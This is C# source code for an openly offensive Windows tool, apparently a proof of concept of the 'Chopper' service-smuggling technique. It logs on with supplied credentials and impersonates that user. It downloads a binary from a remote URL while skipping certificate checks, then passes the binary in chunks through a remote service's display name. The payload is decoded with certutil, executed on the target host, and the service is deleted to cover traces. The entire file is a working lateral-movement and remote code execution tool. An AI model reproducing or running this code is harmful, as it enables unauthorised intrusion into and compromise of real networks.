
/*
 * Author : zux0x3a  
 * 0xsp SRD , Ired.DEV 
 * Chopper Windows Services Smuggling technique (https://www.exploit-db.com/docs/50000)
 */


using Microsoft.Win32.SafeHandles;
using System.Linq;
using System.Net;
using System.Reflection.Metadata;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Security.Principal;
using System.Collections.Generic;
using System.Text;


      class Tchooper
{


    private const uint SERVICE_NO_CHANGE = 0xffffffff;

    public const string LowerCaseAlphabet = "abcdefghijklmnopqrstuvwyxz";

    [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool LogonUser(
  [MarshalAs(UnmanagedType.LPStr)] string pszUserName,
  [MarshalAs(UnmanagedType.LPStr)] string pszDomain,
  [MarshalAs(UnmanagedType.LPStr)] string pszPassword,
  int dwLogonType,
  int dwLogonProvider,
  ref IntPtr phToken);



    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("advapi32.dll", EntryPoint = "CloseServiceHandle")]
    private static extern int CloseServiceHandle(IntPtr hSCObject);


    [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern IntPtr CreateService(
    IntPtr hSCManager,
    string lpServiceName,
    string lpDisplayName,
    uint dwDesiredAccess,
    uint dwServiceType,
    uint dwStartType,
    uint dwErrorControl,
    string lpBinaryPathName,
    [Optional] string lpLoadOrderGroup,
    [Optional] string lpdwTagId,    // only string so we can pass null
    [Optional] string lpDependencies,
    [Optional] string lpServiceStartName,
    [Optional] string lpPassword);


    [DllImport("advapi32", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool StartService(
                IntPtr hService,
            int dwNumServiceArgs,
            string[] lpServiceArgVectors
            );


    [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType,
    int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup,
    string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword,
    string lpDisplayName);


    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool ChangeServiceConfig(
    IntPtr hService,
    uint nServiceType,
    uint nStartType,
    uint nErrorControl,
    string lpBinaryPathName,
    string lpLoadOrderGroup,
    IntPtr lpdwTagId,
    [In] char[] lpDependencies,
    string lpServiceStartName,
    string lpPassword,
    string lpDisplayName);


    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteService(IntPtr hService);



    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);



    public static string fetch_binary(string shellcode_url)

    {
        WebClient dwl = new WebClient();

        dwl.Headers.Add("User-Agent", "Mozilla/5.0 (windows)");
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;


        ServicePointManager.ServerCertificateValidationCallback = delegate
        {
            return true;
        };

        Console.WriteLine("[+] Fetch remote resource");

        byte[] chunk = dwl.DownloadData(shellcode_url);
        string  data = Convert.ToBase64String(chunk); 

        return data;


    }



    // https://stackoverflow.com/questions/4616685/how-to-generate-a-random-string-and-specify-the-length-you-want-or-better-gene
    static Random rd = new Random();
    internal static string CreateString(int stringLength)
    {
        const string allowedChars = "ABCDEFGHJKLMNOPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        char[] chars = new char[stringLength];

        for (int i = 0; i < stringLength; i++)
        {
            chars[i] = allowedChars[rd.Next(0, allowedChars.Length)];
        }

        return new string(chars);
    }



    public static void func(string encoded_payload,string SCmachine)
    {


        bool bResult = false;

        int payload = encoded_payload.Length; // get the size of payload 
      
        Console.WriteLine("[X] Size of Payload : "+payload.ToString());
        
        string service_name = CreateString(6);
        string r_payload = CreateString(7);
        string tmp_command = "c:\\windows\\system32\\cmd.exe /c powershell -command \"Get-Service " + service_name + "|select -Expand DisplayName |out-file -append C:\\windows\\temp\\tmp_p.txt\"";
        string Final_payload = "c:\\windows\\system32\\cmd.exe /c certutil -decode -f C:\\windows\\temp\\tmp_p.txt C:\\windows\\temp\\"+r_payload+".jlp"+" && del C:\\windows\\temp\\tmp_p.txt && c:\\windows\\system32\\cmd.exe /c C:\\windows\\temp\\"+r_payload+".jlp ";

        IntPtr handle = OpenSCManager(SCmachine, null, (uint)0xF003F); // ALL ACCESS FLAG 

        if (handle == IntPtr.Zero)
        {
            throw new Exception(String.Format("Error connecting to Service Control Manager. Error provided was: 0x{0:X}", Marshal.GetLastWin32Error()));

        }
        IntPtr service = CreateService(handle, service_name, " ", 0xF01FF, 0x00000010, 0x00000003, 0x00000001, tmp_command, null, null, null, null, null);
        if (service == IntPtr.Zero)
        {
            throw new Exception(String.Format("Error opening service for modifying. Error returned was: 0x{0:X}", Marshal.GetLastWin32Error()));
        }
        bResult = StartService(service, 0, null);
        uint dwResult = GetLastError();

        if (!bResult && dwResult != 1053)
        {
            Console.WriteLine("[!] StartServiceA failed to start the service. Error:{0}", GetLastError());
            Environment.Exit(0);
        }
        else
        {
            Console.WriteLine("[*] Service was started");
        }

        int chunkSize = 150;
        int p = 0;

        for (p = 0; p < payload; p += chunkSize)
        {
            if (p + chunkSize > payload) chunkSize = payload - p;

          //  Console.WriteLine(encoded_payload.Substring(p, chunkSize));  
        
            // for (i = 0; i < payload; i++)

            //  {


            ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, null, null, IntPtr.Zero, null, null, null, encoded_payload.Substring(p,chunkSize));
          


            StartService(service, 0, null); // prefer with not exception handler 
      

        }

        bool res = ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, Final_payload, null, IntPtr.Zero, null, null, null, "Final_Sensor");
        if (false == res)
        {

            throw new Exception(String.Format("Error ChangeServiceConfigA. Error provided was: 0x{0:X}", Marshal.GetLastWin32Error()));

        }
        res = StartService(service, 0, null); 
      //  if (false == res)
      //  {

       //     throw new Exception(String.Format("Error StartService. Error provided was: 0x{0:X}", Marshal.GetLastWin32Error()));

      //  }



        res = DeleteService(service);
        if (false == res)
        {
            throw new Exception(String.Format("Error Deteting service. Error provided was: 0x{0:X}", Marshal.GetLastWin32Error()));

        }

        //Clean up

        CloseServiceHandle(service);

        CloseServiceHandle(handle);
    }




    static void Main(string[] args)
    {
        const int LOGON32_PROVIDER_DEFAULT = 0;
        const int LOGON32_LOGON_NEW_CREDENTIALS = 9; 

        String domain = args[0];
        String username = args[1];
        String password = args[2];
        String host = args[3]; 
        String URL = args[4]; 




       
        IntPtr Token = IntPtr.Zero; 

        bool returnValue = LogonUser(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, ref  Token);
        if (false == returnValue )
        {
            int ret = Marshal.GetLastWin32Error();
            Console.WriteLine("LogonUser failed with error code : {0}", ret);
            throw new System.ComponentModel.Win32Exception(ret);
        }
        Console.WriteLine("Did LogonUser Succeed? " + (returnValue ? "Yes" : "No"));
        
       bool res = ImpersonateLoggedOnUser(Token);
        if (false == res)
        {
            int ret = Marshal.GetLastWin32Error();
            Console.WriteLine("LogonUser failed with error code : {0}", ret);
            throw new System.ComponentModel.Win32Exception(ret);
        }

       string data = fetch_binary(URL); // base64 cotent of remote binary 

       func(data,host); // chopper attack starts here 
       

    }



}

